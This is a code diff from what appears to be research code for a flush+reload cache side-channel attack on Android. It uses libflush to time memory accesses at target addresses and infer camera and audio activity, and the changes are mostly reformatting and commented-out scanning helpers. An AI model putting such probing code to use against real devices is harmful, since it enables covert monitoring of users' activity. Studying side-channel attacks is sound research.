@@ -174,9 +174,7 @@ attack_slaveX(libflush_session_t *libflush_session, int sum_length, pthread_mute
     LOGD("Finish stage 1.1.\n");
 }
 
-void
-stage1_(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
-        int *finishtrial1, int sum_length) {
+void stage1_(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1,int sum_length){
     LOGD("Start stage 1.1.\n");
     /* Initialize libflush */
     libflush_session_t *libflush_session;
@@ -227,7 +225,7 @@ stage1_(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, i
                     }
                 }
             } else if (addr[j] != 0) {//j==0 3
-                void *target = (void *) addr[j];
+                void* target = (void *) addr[j];
                 count = libflush_reload_address_and_flush(libflush_session, target);
                 if (count <= threshold && j < 4) {
                     LOGD("Target %d-%d-%p.", j, (int) count, target);
@@ -246,9 +244,7 @@ stage1_(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, i
     libflush_terminate(libflush_session);
 }
 
-void
-stage1(int *arr, size_t threshold, int *length_of_camera_audio, size_t *addr, int *camera_audio,
-       int *finishtrial1) {
+void stage1(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr, int* camera_audio, int* finishtrial1){
     LOGD("Start stage 1.\n");
     /* Initialize libflush */
     libflush_session_t *libflush_session;
@@ -453,9 +449,30 @@ int hit5(void *param, int length, int threshold) {
     libflush_session_t *libflush_session;
     libflush_init(&libflush_session, NULL);
     is_address_in_use1(libflush_session, param, threshold);
+//    libflush_terminate(libflush_session);
+
 
     return 0;
 }
+
+//int hit6(size_t *param, int length, int threshold) {
+////    LOGD("Start AddressScan hit2.\n");
+//    libflush_session_t *libflush_session;
+//    libflush_init(&libflush_session, NULL);
+//    size_t count2;
+//
+//    for (int i = 1; i < length; i++) {
+//        void *target = (void *) *((size_t *) param + i);
+//        count2 = libflush_reload_address(libflush_session, target);
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", target, count2);
+//    }
+/////    count2 = libflush_probe(libflush_session, address);
+//
+//
+//    is_address_in_use1(libflush_session, param, threshold);
+//
+//    return 0;
+//}
 
 
 int charToBin(unsigned char letter) {
@@ -557,7 +574,7 @@ int get_threshold() {
     LOGD("Start get_threshold.\n");
     /* Initialize libflush */
     int threshold = 0;
-    libflush_session_t *libflush_session;
+    libflush_session_t* libflush_session;
     libflush_init(&libflush_session, NULL);
     /* Start calibration */
     threshold = calibrate(libflush_session);//calibrate the threshold
@@ -566,7 +583,8 @@ int get_threshold() {
         return threshold;
     /* Terminate libflush */
     //LOGD("Be adjusted to %d.\n",threshold);
-//    libflush_terminate(libflush_session);
+//    gives the error
+//   libflush_terminate(libflush_session);
     return threshold;
 }
 
@@ -717,14 +735,34 @@ is_address_in_use1(libflush_session_t *libflush_session, void *address, int thre
 
     count2 = libflush_reload_address_and_flush(libflush_session, address);
 ///    count2 = libflush_probe(libflush_session, address);
-//    LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+    LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
 
 
-    if (count2 < 800) {
-        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
-    }
+//    if (count2 < 800) {
+//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+//    }
 
 }
+
+//static void
+//is_address_in_use2(libflush_session_t *libflush_session, size_t *address, int threshold) {
+//    int i = 0;
+//    size_t count1;
+//    size_t count2;
+//
+//    count2 = libflush_reload_address(libflush_session, address);
+/////    count2 = libflush_probe(libflush_session, address);
+//    LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+//
+//
+////    if (count2 < 800) {
+////        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
+////    }
+//
+//}
+
+
+
 
 
 
